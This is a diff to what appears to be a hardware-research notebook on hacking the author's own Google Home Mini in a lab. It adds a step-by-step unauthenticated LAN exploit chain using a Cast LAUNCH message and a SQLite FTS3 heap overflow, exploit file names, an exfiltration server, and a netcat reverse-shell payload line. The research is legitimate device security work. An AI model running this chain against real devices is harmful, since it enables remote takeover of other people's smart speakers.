@@ -564,3 +564,119 @@ UDP stream appears on the LAN.
 Also of interest for this piste: `factory_store` (mtd10) contains the device's unique
 TLS client cert and private key. **Dump this first** (`nanddump -f /tmp/fstore.bin /dev/mtd10`)
 before any write operations — losing it permanently breaks Cast device authentication.
+
+---
+
+## Pure-software exploit chain (no hardware required)
+
+### F16. Magellan — software RCE via Cast LAUNCH + WebSQL FTS3 overflow
+
+**CVEs:** CVE-2018-20346, CVE-2018-20505, CVE-2018-20506  
+**Source:** Tencent Blade Team, DEF CON 27 / Black Hat USA 2019  
+**Reference:** https://blade.tencent.com/en/advisories/sqlite/
+
+**The chain (LAN, zero auth, zero user interaction):**
+
+1. Attacker connects to Cast V2 port 8009 (TLS, `InsecureSkipVerify`) — no credentials.
+2. Attacker sends a `LAUNCH` Cast message pointing to an attacker-controlled HTML URL.
+3. `cast_shell` fetches and renders the page in its embedded Chromium — JS runs.
+4. JS opens a WebSQL database and issues crafted FTS3 SQL queries.
+5. `fts3_snippet()` with out-of-range column index → heap-buffer overflow in `Fts3SnippetFindPositions()`.
+6. Heap spray + ASLR leak → overwrite function pointer → `system()` call → RCE inside `cast_shell`.
+
+**Vulnerability condition:** SQLite < 3.26.0 with FTS3 enabled. The patch reached Google Home
+via OTA in January 2019. Our device has **never taken an OTA** (`new_version: "0.0.0.0"`),
+so if the factory image shipped before January 2019, the device is vulnerable.
+
+**Gate:** check the `cast_build_date` field from `eureka_info` (full params). The 512-byte BLE
+cap likely truncated this field; use the setup API after provisioning:
+
+```bash
+curl -sk 'http://<mini-on-pi-lan>:8008/setup/eureka_info' | python3 -m json.tool | grep build
+# OR from the setup hotspot:
+curl -sk 'https://192.168.255.249:8443/setup/eureka_info?params=build_info' | python3 -m json.tool
+```
+
+If `cast_build_date` < 2019-01-xx → SQLite unpatched → **Magellan applicable**.
+
+**Files:**
+- `reconstruction/exploit/magellan/cast_launch.py` — sends Cast LAUNCH over port 8009
+- `reconstruction/exploit/magellan/probe.html` — confirms SQLite version + FTS3 via WebSQL
+- `reconstruction/exploit/magellan/magellan.html` — Phase 1 (version check) + Phase 2 (crash trigger) + Phase 3 scaffold (RCE, needs binary offsets)
+- `reconstruction/exploit/magellan/exfil_server.py` — Pi-side HTTP server that serves pages and logs exfil POSTs from the device
+
+**PoC status:** Tencent did not release exploit code. Phase 3 of `magellan.html` requires the
+`cast_shell` binary's `system()` PLT offset and a writable function pointer reachable from the
+FTS3 heap path. These must be extracted from the binary via Ghidra.
+
+### F17. `/setup/connect_wifi` exact format — RSA PKCS#1 v1.5 `enc_passwd`
+
+Source: GHLocalApi, interfect gist, GHLocalApi issue #88.
+
+The correct JSON payload for provisioning:
+```json
+{
+  "bssid":      "<AP BSSID>",
+  "signal_level": -40,
+  "ssid":       "<AP SSID>",
+  "wpa_auth":   7,
+  "wpa_cipher": 4,
+  "enc_passwd": "<base64(PKCS1v15_encrypt(psk, device_public_key))>"
+}
+```
+
+Padding is **PKCS#1 v1.5** (NOT OAEP). We have the device's `public_key` from E3.
+`scripts/provision-wifi.py` has been updated to auto-fetch the key, encrypt with pycryptodome,
+and fall back to plaintext `password` if pycryptodome is absent.
+
+**Install dep:** `pip install pycryptodome` then run:
+```bash
+python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345
+```
+
+### Piste 9 — Magellan software exploit (no hardware required)
+
+**Step 1 — Provision onto Pi AP:**
+```bash
+sudo bash scripts/lab-ap.sh start
+python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345
+# Watch DHCP log: note the Mini's IP (will be 10.42.0.x)
+```
+
+**Step 2 — Confirm Magellan applicable:**
+```bash
+# Get build_date from the device now on LAN:
+curl -s http://10.42.0.100:8008/setup/eureka_info | python3 -m json.tool | grep -E "build|version"
+# If cast_build_date < 2019-01-xx → proceed
+```
+
+**Step 3 — Run probe to confirm FTS3 + SQLite version:**
+```bash
+# On Pi:
+python3 reconstruction/exploit/magellan/exfil_server.py --ip 10.42.0.1
+# In second terminal:
+python3 reconstruction/exploit/magellan/cast_launch.py \
+    10.42.0.100 http://10.42.0.1:8080/probe.html
+# Watch exfil_server output for: "SQLite X.Y.Z | FTS3: YES | Magellan: VULNERABLE"
+```
+
+**Step 4 — Crash trigger (confirm heap overflow):**
+```bash
+python3 reconstruction/exploit/magellan/cast_launch.py \
+    10.42.0.100 http://10.42.0.1:8080/magellan.html
+# If cast_shell crashes (device reboots or goes silent) → overflow confirmed
+```
+
+**Step 5 — Full RCE (requires binary offsets):**
+- Use Ghidra on `cast_shell` (ARM ELF) to find `system()` PLT offset + writable FTS3 function pointer
+- Fill in `SYSTEM_PLT_OFFSET` + `FPTR_HEAP_OFFSET` in `magellan.html` Phase 3
+- Shellcode: `system("id > /tmp/pwned && nc 10.42.0.1 4444 -e /bin/sh")`
+
+**Getting the binary without hardware:** after Phase 2 crashes `cast_shell`, if the process
+leaves a core dump, `/proc/<pid>/maps` can give the load addresses. Alternatively, `cast_shell`
+is likely identical across all `3.75.x` builds — check if a community dump exists (the
+`juniperchow/unbrick-google-home-mini` repo may contain one).
+
+**Abort condition:** if `cast_build_date` ≥ 2019-01-xx (SQLite already patched in factory
+image), Magellan does not apply. Next option: fuzz the mDNS/SSDP parser or wait for a
+newer Cast CVE affecting this Chromium version.
